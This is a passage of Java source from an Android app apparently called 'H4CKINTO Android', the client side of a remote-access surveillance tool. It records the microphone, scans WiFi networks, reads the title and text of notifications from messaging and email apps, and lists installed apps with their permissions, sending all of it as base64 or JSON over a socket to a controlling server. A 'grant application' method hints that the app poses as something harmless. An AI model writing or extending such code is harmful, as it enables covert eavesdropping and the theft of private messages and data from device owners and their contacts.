                            Log.e(TAG, "❌ Error stopping recording: " + e.getMessage());
                            try {
                                JSONObject errorData = new JSONObject();
                                errorData.put("type", "audio");
                                errorData.put("data", "");
                                errorData.put("status", "Recording stop failed: " + e.getMessage());
                                errorData.put("error", e.getClass().getSimpleName());
                                socket.emit(Constants.MESSAGE_MIC, errorData);
                            } catch (Exception jsonError) {
                                Log.e(TAG, "Error creating error response: " + jsonError.getMessage());
                            }
                        }
                    }
                }, finalDuration * 1000L); // Convert to milliseconds
                
                // Send immediate response that recording started
                micData.put("type", "audio");
                micData.put("data", "Recording started");
                micData.put("status", "Recording in progress");
                micData.put("duration", finalDuration + " seconds");
                socket.emit(Constants.MESSAGE_MIC, micData);
                Log.d(TAG, "Sent recording started response");
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error starting recording: " + e.getMessage(), e);
                micData.put("type", "audio");
                micData.put("data", "");
                micData.put("status", "Recording failed: " + e.getMessage());
                micData.put("error", e.getClass().getSimpleName());
                socket.emit(Constants.MESSAGE_MIC, micData);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending microphone data: " + e.getMessage());
        }
    }
    
    private void processRecordedAudio(java.io.File tempFile) {
        try {
            JSONObject micData = new JSONObject();
            
            // Check if file was created and get its size
            if (tempFile.exists()) {
                long fileSize = tempFile.length();
                Log.d(TAG, "Audio file exists: " + tempFile.getAbsolutePath() + " (" + fileSize + " bytes)");
                
                if (fileSize > 0) {
                    // Read the audio file and send it as base64
                    try {
                        java.io.FileInputStream fis = new java.io.FileInputStream(tempFile);
                        byte[] audioData = new byte[(int) fileSize];
                        int bytesRead = fis.read(audioData);
                        fis.close();
                        
                        Log.d(TAG, "Read " + bytesRead + " bytes from audio file");
                        
                        // Convert to base64
                        String base64Audio = android.util.Base64.encodeToString(audioData, android.util.Base64.NO_WRAP);
                        
                        // Send as file data (matching server expectation)
                        JSONObject fileData = new JSONObject();
                        fileData.put("file", true);
                        fileData.put("name", "audio_recording_" + System.currentTimeMillis() + ".3gp");
                        fileData.put("buffer", base64Audio);
                        fileData.put("type", "audio/3gpp");
                        fileData.put("size", fileSize);
                        fileData.put("timestamp", System.currentTimeMillis());
                        
                        socket.emit(Constants.MESSAGE_MIC, fileData);
                        Log.d(TAG, "✅ Sent audio file data: " + fileSize + " bytes (base64: " + base64Audio.length() + " chars)");
                        
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error reading audio file: " + e.getMessage(), e);
                        micData.put("type", "audio");
                        micData.put("data", "");
                        micData.put("status", "Failed to read audio file: " + e.getMessage());
                        micData.put("error", e.getClass().getSimpleName());
                        socket.emit(Constants.MESSAGE_MIC, micData);
                    }
                } else {
                    Log.e(TAG, "❌ Recording failed - empty file (0 bytes)");
                    micData.put("type", "audio");
                    micData.put("data", "");
                    micData.put("status", "Recording failed - empty file");
                    micData.put("error", "File is empty (0 bytes)");
                    socket.emit(Constants.MESSAGE_MIC, micData);
                }
                
                // Clean up the temporary file
                boolean deleted = tempFile.delete();
                Log.d(TAG, "Temporary audio file deleted: " + deleted);
            } else {
                Log.e(TAG, "❌ Recording failed - no file created at: " + tempFile.getAbsolutePath());
                micData.put("type", "audio");
                micData.put("data", "");
                micData.put("status", "Recording failed - no file created");
                micData.put("error", "File creation failed");
                socket.emit(Constants.MESSAGE_MIC, micData);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error processing recorded audio: " + e.getMessage(), e);
        }
    }
    
    private static String intToIpv4(int ip) {
        return String.format(Locale.US, "%d.%d.%d.%d",
                ip & 0xff, (ip >> 8) & 0xff, (ip >> 16) & 0xff, (ip >> 24) & 0xff);
    }

    /** Local IPv4 for active network (Wi‑Fi / VPN aware when possible). */
    private String getLocalIpv4Address() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) {
                    Network network = cm.getActiveNetwork();
                    if (network != null) {
                        LinkProperties lp = cm.getLinkProperties(network);
                        if (lp != null) {
                            for (LinkAddress la : lp.getLinkAddresses()) {
                                InetAddress addr = la.getAddress();
                                if (addr instanceof Inet4Address && !addr.isLoopbackAddress()) {
                                    return addr.getHostAddress();
                                }
                            }
                        }
                    }
                }
            }
            WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                @SuppressWarnings("deprecation")
                WifiInfo wi = wm.getConnectionInfo();
                if (wi != null && wi.getIpAddress() != 0) {
                    return intToIpv4(wi.getIpAddress());
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "getLocalIpv4Address: " + e.getMessage());
        }
        return "";
    }

    private String getActiveTransportLabel() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return "";
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return "";
            Network n = cm.getActiveNetwork();
            if (n == null) return "none";
            NetworkCapabilities cap = cm.getNetworkCapabilities(n);
            if (cap == null) return "unknown";
            if (cap.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) return "wifi";
            if (cap.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) return "cellular";
            if (cap.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) return "ethernet";
            return "other";
        } catch (Exception e) {
            return "";
        }
    }

    /** Outbound public IPv4 via HTTPS (device must have internet). */
    private String fetchPublicIpv4Sync() {
        final String[] endpoints = {
                "https://api.ipify.org?format=json",
                "https://api.ipify.org"
        };
        for (String endpoint : endpoints) {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(endpoint);
                conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", "H4CKINTO-Android-WiFi");
                conn.setRequestMethod("GET");
                int code = conn.getResponseCode();
                if (code != HttpURLConnection.HTTP_OK) continue;
                InputStream is = conn.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                String body = sb.toString().trim();
                if (endpoint.contains("json")) {
                    JSONObject j = new JSONObject(body);
                    String ip = j.optString("ip", "");
                    if (!ip.isEmpty()) return ip;
                } else if (body.matches("^\\d{1,3}(\\.\\d{1,3}){3}$")) {
                    return body;
                }
            } catch (Exception e) {
                Log.w(TAG, "fetchPublicIpv4 failed: " + endpoint + " — " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }
        return "";
    }

    private static String stripQuotes(String s) {
        if (s == null) return "";
        if (s.length() >= 2 && s.startsWith("\"") && s.endsWith("\"")) {
            return s.substring(1, s.length() - 1);
        }
        return s;
    }

    /**
     * Collect WiFi scan results and emit 0xWI. Server expects { networks, count, status, publicIp, localIpv4, ... }.
     * Android 6+ requires runtime location permission for getScanResults() on most devices.
     */
    private void sendWifiData() {
        com.h4ckinto.android.utils.AppExecutors.get().io().execute(() -> {
            JSONObject wifiData = new JSONObject();
            JSONArray networks = new JSONArray();
            String status = "OK";
            try {
                WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                String localIpv4 = getLocalIpv4Address();
                String connectedSsid = "";
                int linkSpeedMbps = -1;
                if (wm != null) {
                    try {
                        @SuppressWarnings("deprecation")
                        WifiInfo wi = wm.getConnectionInfo();
                        if (wi != null) {
                            connectedSsid = stripQuotes(wi.getSSID());
                            if ("<unknown ssid>".equalsIgnoreCase(connectedSsid)) connectedSsid = "";
                            linkSpeedMbps = wi.getLinkSpeed();
                        }
                    } catch (Exception ignored) {
                    }
                }

                if (wm == null) {
                    status = "WifiManager unavailable";
                } else if (!wm.isWifiEnabled()) {
                    status = "WiFi is disabled on device";
                } else {
                    boolean needLocation = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M;
                    boolean hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                    boolean hasCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                    if (needLocation && !hasFine && !hasCoarse) {
                        status = "Grant location permission for WiFi scan (Settings → App permissions)";
                    } else {
                        try {
                            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                                @SuppressWarnings("deprecation")
                                boolean started = wm.startScan();
                                Log.d(TAG, "WiFi startScan: " + started);
                            }
                            Thread.sleep(1200);
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        } catch (Exception ignored) {
                        }

                        List<ScanResult> results = null;
                        try {
                            results = wm.getScanResults();
                        } catch (SecurityException se) {
                            status = "SecurityException: need location permission for WiFi scan";
                            Log.e(TAG, status, se);
                        }

                        if (results != null) {
                            HashSet<String> seen = new HashSet<>();
                            for (ScanResult r : results) {
                                if (r == null || r.BSSID == null) continue;
                                String bssid = r.BSSID;
                                String rawSsid = r.SSID != null ? r.SSID : "";
                                String dedupe = bssid + "|" + rawSsid;
                                if (seen.contains(dedupe)) continue;
                                seen.add(dedupe);

                                String ssid = stripQuotes(rawSsid);
                                JSONObject w = new JSONObject();
                                w.put("SSID", ssid.isEmpty() ? "(hidden)" : ssid);
                                w.put("BSSID", bssid);
                                w.put("level", r.level);
                                w.put("rssiDbm", r.level);
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                    w.put("frequency", r.frequency);
                                    w.put("band", r.frequency >= 5000 ? "5GHz" : "2.4GHz");
                                    w.put("channelWidth", r.channelWidth);
                                    w.put("centerFreq0", r.centerFreq0);
                                }
                                w.put("capabilities", r.capabilities != null ? r.capabilities : "");
                                networks.put(w);
                            }
                            if (networks.length() == 0) {
                                status = "No networks in scan (empty list — try enabling WiFi and location)";
                            }
                        }
                    }
                }

                String publicIp = fetchPublicIpv4Sync();
                wifiData.put("publicIp", publicIp);
                wifiData.put("localIpv4", localIpv4);
                wifiData.put("connectedSsid", connectedSsid);
                if (linkSpeedMbps >= 0) {
                    wifiData.put("linkSpeedMbps", linkSpeedMbps);
                }
                wifiData.put("activeTransport", getActiveTransportLabel());
                wifiData.put("scanAt", System.currentTimeMillis());

                wifiData.put("networks", networks);
                wifiData.put("count", networks.length());
                wifiData.put("status", status);

                if (isConnected && socket != null) {
                    socket.emit(Constants.MESSAGE_WIFI, wifiData);
                    Log.d(TAG, "Sent WiFi data: count=" + networks.length() + " publicIp=" + publicIp + " local=" + localIpv4 + " status=" + status);
                } else {
                    Log.w(TAG, "WiFi scan done but socket disconnected");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending WiFi data", e);
                try {
                    wifiData.put("networks", new JSONArray());
                    wifiData.put("count", 0);
                    wifiData.put("status", "Error: " + e.getMessage());
                    wifiData.put("publicIp", "");
                    wifiData.put("localIpv4", "");
                    if (isConnected && socket != null) {
                        socket.emit(Constants.MESSAGE_WIFI, wifiData);
                    }
                } catch (Exception e2) {
                    Log.e(TAG, "Error sending WiFi error payload", e2);
                }
            }
        });
    }
    
    private void sendNotificationData() {
        try {
            JSONObject notificationData = new JSONObject();
            JSONArray notificationsList = new JSONArray();

            try {
                // Check if notification listener service is enabled
                boolean isListenerEnabled = isNotificationListenerEnabled();
                
                if (!isListenerEnabled) {
                    notificationData.put("notifications", new JSONArray());
                    notificationData.put("count", 0);
                    notificationData.put("status", "Notification listener service is NOT ENABLED. Please enable it in Settings > Apps > H4CKINTO Android > Notifications > Allow notification access");
                    notificationData.put("listenerEnabled", false);
                    notificationData.put("instructions", "Go to Android Settings > Apps > H4CKINTO Android > Notifications > Allow notification access and enable it");
                } else {
                    // Get active notifications from NotificationManager
                    android.app.NotificationManager notificationManager = 
                        (android.app.NotificationManager) context.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        android.service.notification.StatusBarNotification[] activeNotifications = 
                            notificationManager.getActiveNotifications();
                        
                        if (activeNotifications != null && activeNotifications.length > 0) {
                            for (android.service.notification.StatusBarNotification sbn : activeNotifications) {
                                try {
                                    JSONObject notification = new JSONObject();
                                    String packageName = sbn.getPackageName();
                                    
                                    // Get app name
                                    String appName = getAppName(packageName);
                                    
                                    notification.put("key", sbn.getKey());
                                    notification.put("packageName", packageName);
                                    notification.put("appName", appName);
                                    notification.put("postTime", sbn.getPostTime());
                                    notification.put("timestamp", sbn.getPostTime());
                                    
                                    // Format post time
                                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                                    notification.put("postTimeFormatted", sdf.format(new java.util.Date(sbn.getPostTime())));
                                    
                                    // Extract notification content
                                    String content = extractNotificationContent(sbn);
                                    notification.put("content", content);
                                    
                                    // Get notification title and text separately
                                    String title = extractNotificationTitle(sbn);
                                    String text = extractNotificationText(sbn);
                                    notification.put("title", title != null ? title : "No title");
                                    notification.put("text", text != null ? text : "No text");
                                    
                                    // Check if it's an important app
                                    notification.put("isImportant", isImportantApp(packageName));
                                    
                                    // Get notification icon info
                                    notification.put("hasIcon", sbn.getNotification().getSmallIcon() != null);
                                    
                                    // Add category
                                    notification.put("category", getAppCategory(packageName));
                                    
                                    notificationsList.put(notification);
                                } catch (Exception e) {
                                    Log.w(TAG, "Error processing notification: " + e.getMessage());
                                }
                            }
                        } else {
                            notificationData.put("status", "No active notifications found");
                        }
                    } else {
                        notificationData.put("status", "Android version too old for notification access");
                    }

                    notificationData.put("notifications", notificationsList);
                    notificationData.put("count", notificationsList.length());
                    notificationData.put("listenerEnabled", true);
                    notificationData.put("totalActive", notificationsList.length());
                }

            } catch (SecurityException e) {
                notificationData.put("notifications", new JSONArray());
                notificationData.put("count", 0);
                notificationData.put("status", "Notification permission denied: " + e.getMessage());
                notificationData.put("listenerEnabled", false);
            } catch (Exception e) {
                notificationData.put("notifications", new JSONArray());
                notificationData.put("count", 0);
                notificationData.put("status", "Notification error: " + e.getMessage());
                notificationData.put("listenerEnabled", false);
            }
            
            socket.emit(Constants.MESSAGE_NOTIFICATION, notificationData);
            Log.d(TAG, "Sent notification data: " + notificationsList.length() + " notifications");
        } catch (Exception e) {
            Log.e(TAG, "Error sending notification data: " + e.getMessage());
        }
    }
    
    private boolean isNotificationListenerEnabled() {
        try {
            String pkgName = context.getPackageName();
            String flat = android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                "enabled_notification_listeners"
            );
            
            if (flat != null && !flat.isEmpty()) {
                String[] list = flat.split(":");
                for (String name : list) {
                    android.content.ComponentName cn = android.content.ComponentName.unflattenFromString(name);
                    if (cn != null && pkgName.equals(cn.getPackageName())) {
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener status: " + e.getMessage());
            return false;
        }
    }
    
    private String getAppCategory(String packageName) {
        // Categorize apps by type
        if (packageName.startsWith("com.whatsapp") || packageName.startsWith("com.telegram") || 
            packageName.startsWith("com.facebook.orca") || packageName.startsWith("com.skype")) {
            return "Messaging";
        } else if (packageName.startsWith("com.instagram") || packageName.startsWith("com.snapchat") || 
                   packageName.startsWith("com.twitter") || packageName.startsWith("com.facebook")) {
            return "Social Media";
        } else if (packageName.startsWith("com.google.android.gm") || packageName.startsWith("com.microsoft") ||
                   packageName.startsWith("com.outlook")) {
            return "Email";
        } else if (packageName.startsWith("com.android.phone") || packageName.startsWith("com.android.mms")) {
            return "Phone/SMS";
        } else if (packageName.startsWith("com.spotify") || packageName.startsWith("com.youtube") ||
                   packageName.startsWith("com.netflix")) {
            return "Media";
        } else if (packageName.startsWith("com.google") || packageName.startsWith("com.android")) {
            return "System";
        } else {
            return "Other";
        }
    }
    
    private String getAppName(String packageName) {
        try {
            return context.getPackageManager().getApplicationLabel(
                context.getPackageManager().getApplicationInfo(packageName, 0)
            ).toString();
        } catch (Exception e) {
            return packageName;
        }
    }
    
    private boolean isImportantApp(String packageName) {
        String[] importantApps = {
            "com.whatsapp", "com.facebook.orca", "com.instagram.android", 
            "com.google.android.gm", "com.android.mms", "com.android.phone",
            "com.skype.raider", "com.telegram.messenger", "com.twitter.android",
            "com.snapchat.android", "com.discord", "com.viber.voip",
            "com.slack", "com.microsoft.teams", "com.spotify.music",
            "com.netflix.mediaclient", "com.youtube", "com.tiktok"
        };
        
        for (String app : importantApps) {
            if (packageName.startsWith(app)) {
                return true;
            }
        }
        return false;
    }
    
    private String extractNotificationContent(android.service.notification.StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                String title = sbn.getNotification().extras.getString("android.title");
                String text = sbn.getNotification().extras.getString("android.text");
                
                StringBuilder content = new StringBuilder();
                if (title != null) {
                    content.append("Title: ").append(title);
                }
                if (text != null) {
                    if (content.length() > 0) content.append("\n");
                    content.append("Text: ").append(text);
                }
                
                return content.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting notification content", e);
        }
        return "No content available";
    }
    
    private String extractNotificationTitle(android.service.notification.StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                return sbn.getNotification().extras.getString("android.title");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting notification title", e);
        }
        return null;
    }
    
    private String extractNotificationText(android.service.notification.StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                return sbn.getNotification().extras.getString("android.text");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting notification text", e);
        }
        return null;
    }
    
    private void sendClipboardData() {
        try {
            JSONObject clipboardData = new JSONObject();
            clipboardData.put("content", "");
            clipboardData.put("timestamp", System.currentTimeMillis());
            clipboardData.put("status", "Clipboard data not available");
            
            socket.emit(Constants.MESSAGE_CLIPBOARD, clipboardData);
            Log.d(TAG, "Sent clipboard data");
        } catch (Exception e) {
            Log.e(TAG, "Error sending clipboard data: " + e.getMessage());
        }
    }
    
    private void sendInstalledAppsData() {
        if (installedAppsExecutor == null) {
            synchronized (this) {
                if (installedAppsExecutor == null) {
                    installedAppsExecutor = Executors.newSingleThreadExecutor();
                }
            }
        }
        installedAppsExecutor.execute(() -> {
            try {
                PackageManager pm = context.getPackageManager();
                List<ApplicationInfo> appList = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JSONArray appsArray = new JSONArray();
                for (ApplicationInfo ai : appList) {
                    try {
                        if (pm.getLaunchIntentForPackage(ai.packageName) == null)
                            continue;
                        boolean isSystem = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                        boolean isUpdatedSystem = (ai.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
                        if (isSystem && !isUpdatedSystem)
                            continue;
                        PackageInfo pi = pm.getPackageInfo(ai.packageName, PackageManager.GET_PERMISSIONS);
                        JSONObject obj = new JSONObject();
                        CharSequence label = ai.loadLabel(pm);
                        obj.put("appName", label != null ? label.toString() : ai.packageName);
                        obj.put("packageName", ai.packageName);
                        obj.put("versionName", pi.versionName != null ? pi.versionName : "");
                        obj.put("versionCode", pi.getLongVersionCode());
                        obj.put("installTime", pi.firstInstallTime);
                        obj.put("lastUpdateTime", pi.lastUpdateTime);
                        obj.put("systemApp", isSystem);
                        String installer = pm.getInstallerPackageName(ai.packageName);
                        obj.put("installer", installer != null ? installer : "unknown");
                        JSONArray permissions = new JSONArray();
                        if (pi.requestedPermissions != null) {
                            for (String perm : pi.requestedPermissions) {
                                permissions.put(perm);
                            }
                        }
                        obj.put("permissions", permissions);
                        try {
                            File apk = ai.sourceDir != null ? new File(ai.sourceDir) : null;
                            obj.put("apkSize", (apk != null && apk.exists()) ? apk.length() : 0);
                        } catch (Exception ignored) {
                            obj.put("apkSize", 0);
                        }
                        appsArray.put(obj);
                    } catch (Exception e) {
                        Log.w(TAG, "Skip app " + ai.packageName + ": " + e.getMessage());
                    }
                }
                JSONObject result = new JSONObject();
                result.put("apps", appsArray);
                result.put("count", appsArray.length());
                result.put("status", "OK");
                if (isConnected && socket != null) {
                    socket.emit(Constants.MESSAGE_INSTALLED, result);
                    Log.d(TAG, "Apps sent: " + appsArray.length());
                } else {
                    Log.w(TAG, "Apps scan done but socket disconnected, not sending");
                }
            } catch (Exception e) {
                Log.e(TAG, "App scan error", e);
                try {
                    if (isConnected && socket != null) {
                        JSONObject fallback = new JSONObject();
                        fallback.put("apps", new JSONArray());
                        fallback.put("count", 0);
                        fallback.put("status", "Error: " + e.getMessage());
                        socket.emit(Constants.MESSAGE_INSTALLED, fallback);
                    }
                } catch (Exception e2) {
                    Log.e(TAG, "Error sending fallback apps data", e2);
                }
            }
        });
    }
    
    private void sendPermissionsData() {
        try {
            JSONObject permissionsData = new JSONObject();
            permissionsData.put("permissions", new JSONObject());
            permissionsData.put("status", "Permissions data not available");
            
            socket.emit(Constants.MESSAGE_PERMISSIONS, permissionsData);
            Log.d(TAG, "Sent permissions data");
        } catch (Exception e) {
            Log.e(TAG, "Error sending permissions data: " + e.getMessage());
        }
    }
    
    /**
     * Send grant application data to server
     */
    public void sendGrantApplication(JSONObject applicationData) {
        if (!isConnected || socket == null) {
            Log.e(TAG, "Socket not connected, cannot send grant application");
            return;
        }
        
        try {
            socket.emit("grant_application", applicationData);
            Log.d(TAG, "Sent grant application data to server");
        } catch (Exception e) {
            Log.e(TAG, "Error sending grant application: " + e.getMessage());
        }
    }

}